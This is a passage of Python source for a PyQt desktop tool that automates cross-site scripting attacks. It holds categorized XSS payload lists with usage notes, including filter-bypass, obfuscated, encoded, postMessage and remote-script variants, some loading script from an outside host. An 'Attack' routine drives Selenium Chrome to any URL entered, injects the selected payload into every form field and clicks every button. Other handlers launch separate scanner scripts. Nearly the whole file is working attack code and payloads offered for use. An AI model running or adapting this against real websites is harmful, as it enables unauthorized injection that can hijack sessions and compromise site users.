                currentItemText == "‘}alert(1);{‘" or currentItemText == "‘}alert(1)%0A{‘" or currentItemText == "\’}alert(1);{//"):
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript Context — Code Injection in Logical " \
                             "Block\n---------------------------------------------\nUse 1st or 2nd payloads when " \
                             "input lands in a script block, inside a string delimited\nvalue and inside a single " \
                             "logical block like function or conditional (if, else, etc). If\nquote is escaped with a " \
                             "backslash, use 3rd payload. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (currentItemText == "</script><svg onload=alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript Context — Tag Injection\n---------------------------------------------\nUse " \
                             "when input lands anywhere in a script block. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "‘>alert(1)</script><script/1=’" or currentItemText == "*/alert(1)</script><script"
                                                                                          ">/*" or currentItemText ==
                "‘onload=alert(1)><svg/1=’"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Reflection — Double Reflection (Single " \
                             "Input)\n---------------------------------------------\nUse to take advantage of " \
                             "multiple reflections on same page. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "*/alert(1)”>’onload=”/*<svg/1=’" or currentItemText == "`-alert("
                                                                                           "1)”>’onload=”`<svg/1=’"
                or currentItemText == "*/</script>’>alert(1)/*<script/1=’"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Reflection — Triple Reflection (Single " \
                             "Input)\n---------------------------------------------\nUse to take advantage of " \
                             "multiple reflections on same page. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "p=<svg/1=’&q=’onload=alert(1)>" or currentItemText == "p=<svg 1=’&q=’onload=’/*&r"
                                                                                          "=*/alert(1)’>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Multi Input Reflections (Double & " \
                             "Triple)\n---------------------------------------------\nUse to take advantage of " \
                             "multiple input reflections on same page. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<svg xmlns='http://www.w3.org/2000/svg' onload=”alert(1)”/>":
            self.payloadDesOutput.clear()
            payloadDesText = "File Upload Injection — SVG File\n---------------------------------------------\nUse to " \
                             "create a stored XSS on target when uploading \nimage files. Save content below as " \
                             "“xss.svg”. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "<img src=1 onerror=alert(1)>" or currentItemText == "<iframe src=javascript"
                                                                                        ":alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "DOM Insert Injection\n---------------------------------------------\nUse to test for " \
                             "XSS when injection gets inserted into DOM as valid \nmarkup instead of being reflected " \
                             "in source code. It works for \ncases where script tag and other vectors won’t work. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "data:text/html,<img src=1 onerror=alert(1)>" or currentItemText == "data:text"
                                                                                                       "/html,"
                                                                                                       "<iframe "
                                                                                                       "src=javascript:alert(1)>"):
            self.payloadDesOutput.clear()
            payloadDesText = "DOM Insert Injection — Resource " \
                             "Request\n---------------------------------------------\nUse when javascript code of the " \
                             "page inserts into page the results \nof a request to an URL controlled by attacker (" \
                             "injection). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<iframe src=TARGET_URL onload=”frames[0].postMessage(‘INJECTION’,’*’)”>":
            self.payloadDesOutput.clear()
            payloadDesText = "Javascript postMessage() DOM Injection (with " \
                             "Iframe)\n---------------------------------------------\nUse when there’s a “message” " \
                             "event listener like in\n“window.addEventListener(‘message’, …)” in javascript code " \
                             "without a check for\norigin. Target must be able to be framed (X-Frame Options header " \
                             "according to\ncontext). Save as HTML file (or using data:text/html) providing " \
                             "TARGET_URL and\nINJECTION (a XSS vector or payload). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<Svg OnLoad=alert(1)>" or currentItemText == "<Script>alert(1)</Script>":
            self.payloadDesOutput.clear()
            payloadDesText = "Mixed Case XSS\n---------------------------------------------\nUse to bypass " \
                             "case-sensitive filters. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "<svg onload=alert(1)//" or currentItemText == "<svg onload=”alert(1)”":
            self.payloadDesOutput.clear()
            payloadDesText = "Unclosed Tags\n---------------------------------------------\nUse in HTML injections to " \
                             "avoid filtering based in the presence of both lower than (<)\nand greater than (>) " \
                             "signs. It requires a native greater than \nsign in source code after input reflection. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>" or currentItemText == "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Uppercase XSS\n---------------------------------------------\nUse when application " \
                             "reflects input in uppercase. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E%2522%253E%253Csvg%2520o"
                                   "%256Enoad%253Dalert%25281%2529%253E"):
            self.payloadDesOutput.clear()
            payloadDesText = "Double Encoded XSS\n---------------------------------------------\nUse when application " \
                             "performs double decoding of input. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "alert`1`":
            self.payloadDesOutput.clear()
            payloadDesText = "Alert without Parentheses (Strings " \
                             "Only)\n---------------------------------------------\nUse in an HTML vector or " \
                             "javascript injection when parentheses \nare not allowed and a simple alert box is " \
                             "enough. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "[][‘\\146\\151\\154\\164\\145\\162’]["
                                   "‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’] "
                                   "(‘\\141\\154\\145\\162\\164\\50\\61\\51’)()"):
            self.payloadDesOutput.clear()
            payloadDesText = "Alert without Alphabetic Chars\n---------------------------------------------\nUse when " \
                             "alphabetic characters are not allowed. Following is alert(1). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "(alert)(1)" or currentItemText == "a=alert,a(1)" or currentItemText == "[1].find(alert)"
                or currentItemText == "top[“al”+”ert”](1)" or currentItemText == "top[/al/.source+/ert/.source](1)" or currentItemText == "al\\u0065rt(1)"
                or currentItemText == "top[‘al\\145rt’](1)" or currentItemText == "top[8680439..toString(30)](1)"):
            self.payloadDesOutput.clear()
            payloadDesText = "Alert Obfuscation\n---------------------------------------------\nUse to trick several " \
                             "regular expression (regex) filters. It might be combined with\nprevious alternatives (" \
                             "above). The shortest option “top” can also be replaced by\n“window”, “parent”, " \
                             "“self” or “this” depending on context. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
                currentItemText == "<script src=data:,alert(1)>" or currentItemText == "<script src=//brutelogic.com"
                                                                                       ".br/1.js>"):
            self.payloadDesOutput.clear()
            payloadDesText = "Script Injection — No Closing\n---------------------------------------------\nUse when " \
                             "there’s a closing script tag (</script>) \nsomewhere in the code after reflection. "
            self.payloadDesOutput.insertPlainText(payloadDesText)

    # Create or clear Basic XXS payload list
    def checkbox_a_click(self):
        if not self.checkbox_A.isChecked():
            self.xxsPayloadlist.clear()
        else:
            self.xxsPayloadlist.insertItem(0, "Basic XXS: ")
            self.xxsPayloadlist.insertItem(1, "<svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(2, "“><svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(3, "</tag><svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(4, "“></tag><svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(5, "javascript:alert(1)")
            self.xxsPayloadlist.insertItem(6, "data:text/html,<svg onload=alert(1)>")
            self.xxsPayloadlist.insertItem(7, "‘}alert(1);{‘")
            self.xxsPayloadlist.insertItem(8, "‘}alert(1)%0A{‘")
            self.xxsPayloadlist.insertItem(9, "\’}alert(1);{//")
            self.xxsPayloadlist.insertItem(10, "</script><svg onload=alert(1)>")

    # Create or clear Advance XXS payload list
    def checkbox_b_click(self):
        if not self.checkbox_B.isChecked():
            self.xxsPayloadlist.clear()
        else:
            self.xxsPayloadlist.insertItem(0, "Advance XXS: ")
            self.xxsPayloadlist.insertItem(1, "‘onload=alert(1)><svg/1=’")
            self.xxsPayloadlist.insertItem(2, "‘>alert(1)</script><script/1=’")
            self.xxsPayloadlist.insertItem(3, "*/alert(1)</script><script>/*")
            self.xxsPayloadlist.insertItem(4, "*/alert(1)”>’onload=”/*<svg/1=’")
            self.xxsPayloadlist.insertItem(5, "`-alert(1)”>’onload=”`<svg/1=’")
            self.xxsPayloadlist.insertItem(6, "*/</script>’>alert(1)/*<script/1=’")
            self.xxsPayloadlist.insertItem(7, "p=<svg/1=’&q=’onload=alert(1)>")
            self.xxsPayloadlist.insertItem(8, "p=<svg 1=’&q=’onload=’/*&r=*/alert(1)’>")
            self.xxsPayloadlist.insertItem(9, "`<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>")
            self.xxsPayloadlist.insertItem(10, "<script src=data:,alert(1)>")
            self.xxsPayloadlist.insertItem(11, "<script src=//brutelogic.com.br/1.js>")
            self.xxsPayloadlist.insertItem(12, "<iframe src=javascript:alert(1)>")
            self.xxsPayloadlist.insertItem(13, "<iframe src=javascript:alert(1)>")
            self.xxsPayloadlist.insertItem(14, "data:text/html,<img src=1 onerror=alert(1)>")
            self.xxsPayloadlist.insertItem(15, "data:text/html,<iframe src=javascript:alert(1)>")
            self.xxsPayloadlist.insertItem(16,
                                           "<iframe src=TARGET_URL onload=”frames[0].postMessage(‘INJECTION’,’*’)”>")

    # Create or clear Filter Bypass XXS payload list
    def checkbox_c_click(self):
        if not self.checkbox_C.isChecked():
            self.xxsPayloadlist.clear()
        else:
            self.xxsPayloadlist.insertItem(0, "Filter Bypass XXS: ")
            # more
            self.xxsPayloadlist.insertItem(1, "<Svg OnLoad=alert(1)>")
            self.xxsPayloadlist.insertItem(2, "<Script>alert(1)</Script>")
            self.xxsPayloadlist.insertItem(3, "<svg onload=alert(1)//")
            self.xxsPayloadlist.insertItem(4, "<svg onload=”alert(1)”")
            self.xxsPayloadlist.insertItem(5, "<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>")
            self.xxsPayloadlist.insertItem(6, "<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>")
            self.xxsPayloadlist.insertItem(7, "%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E")
            self.xxsPayloadlist.insertItem(8, "%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E")
            self.xxsPayloadlist.insertItem(9, "alert`1`")
            self.xxsPayloadlist.insertItem(10,
                                           "[][‘\\146\\151\\154\\164\\145\\162’]["
                                           "‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’] "
                                           "(‘\\141\\154\\145\\162\\164\\50\\61\\51’)()")
            self.xxsPayloadlist.insertItem(11, "(alert)(1)")
            self.xxsPayloadlist.insertItem(12, "a=alert,a(1)")
            self.xxsPayloadlist.insertItem(13, "[1].find(alert)")
            self.xxsPayloadlist.insertItem(14, "top[“al”+”ert”](1)")
            self.xxsPayloadlist.insertItem(15, "top[/al/.source+/ert/.source](1)")
            self.xxsPayloadlist.insertItem(16, "al\\u0065rt(1)")
            self.xxsPayloadlist.insertItem(17, "top[‘al\\145rt’](1)")
            self.xxsPayloadlist.insertItem(18, "top[8680439..toString(30)](1)")

    def onClickedAttackBtn(self):
        # Open Chrome, automate input value and button click. Write to log the process
        if (self.rbtn1.isChecked()):
            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            self.logOutput.insertPlainText("\nStart Attacking................")
            sb = self.logOutput.verticalScrollBar()
            sb.setValue(sb.maximum())

            driver = webdriver.Chrome('./chromedriver')

            self.logOutput.insertPlainText("\nVisiting " + str(self.websiteTextbox.text()))
            sb = self.logOutput.verticalScrollBar()
            sb.setValue(sb.maximum())

            driver.get(self.websiteTextbox.text())
            print(driver.title)
            self.logOutput.insertPlainText("\nAutomating Input Fields attack on " + str(self.websiteTextbox.text()))

            sb = self.logOutput.verticalScrollBar()
            sb.setValue(sb.maximum())
            getbuttons = driver.find_elements(By.XPATH,
                                              '//form//button[contains(@class, "Button") or contains(@class, "button")]')
            getinputs = driver.find_elements(By.XPATH,
                                             '//form//input[not(@aria-label)][contains(@class, "Field") or contains('
                                             '@class, "field") '
                                             'or contains(@type, "email")  or contains(@type, "password") '
                                             'or contains(@type, "text") or contains(@type, "search")'
                                             'and not(contains(@type, "hidden"))]')
            gettextareas = driver.find_elements(By.XPATH,
                                                '//form//textarea[contains(@class, "Text") or contains(@class, "text")]')
            seletedpayload = self.craftingPayloadTextbox.toPlainText()

            for getinput in getinputs:
                self.logOutput.insertPlainText("\nInputting payload: " + str(
                    self.xxsPayloadlist.currentItem().text()) + " to input with class: " + str(
                    getinput.get_attribute("class")))
                print(getinput.get_attribute("class"))
                getinput.send_keys(seletedpayload)
                time.sleep(1)

            for gettextarea in gettextareas:
                self.logOutput.insertPlainText(
                    "\nInputting payload: " + str(
                        self.xxsPayloadlist.currentItem().text()) + " to textarea class: " + str(
                        gettextarea.get_attribute("class")))
                gettextarea.send_keys("hi")
                time.sleep(1)

            for getbutton in getbuttons:
                self.logOutput.insertPlainText(
                    "\nClicking on button with class: " + str(getinput.get_attribute("class")))
                getbutton.click()
                time.sleep(5)

            self.logOutput.insertPlainText("\nFinished attacking on " + str(self.websiteTextbox.text()))

            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

        elif (self.rbtn2.isChecked()):
            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            self.logOutput.insertPlainText("\nStart Attacking................")
            driver = webdriver.Chrome('./chromedriver')
            self.logOutput.insertPlainText("\nAutomating URL attack: " + str(self.craftingPayloadTextbox.toPlainText()))
            driver.get(self.craftingPayloadTextbox.toPlainText())
            self.logOutput.insertPlainText("\nFinished attacking on " + str(self.websiteTextbox.text()))
            self.logOutput.insertPlainText("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            time.sleep(5)

    def changeTabText(self):
        try:
            pc.copy(str(self.websiteTextbox.text()))
            os.system('cd Vulnerability Scan && start /b python xss_with_para.py')
        except Exception as e:
            print("Command could not run", e)

    def changeTabText_2(self):
        try:
            pc.copy(str(self.websiteTextbox.text()))
            os.system(
                'cd Automatic XSS Attack && python 1.py && python 2.py && python 3.py && python 4.py  && python 6.py && python 7.py && python 8.py && python 9.py && python 10.py && python 11.py')
        except:
            print("Command could not run")

    def changeTabText_3(self):
        abc = "Hello"
        print(abc)
        try:
            pc.copy(str(self.websiteTextbox.text()))
            os.system('cd Fuzz Scanning && python Parameters.py')
        except Exception as e:
            print(f"Command could not run. Error: {e}")

    def changeTabText_4(self):
        try:
            pc.copy(str(self.websiteTextbox.text()))
            os.system('cd DOM Scanner && python lib.py')
        except:
            print("Command could not run")


if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    Dialog = QtWidgets.QDialog()
    ui = App()
    ui.setupUi(Dialog)
    Dialog.show()
    sys.exit(app.exec_())
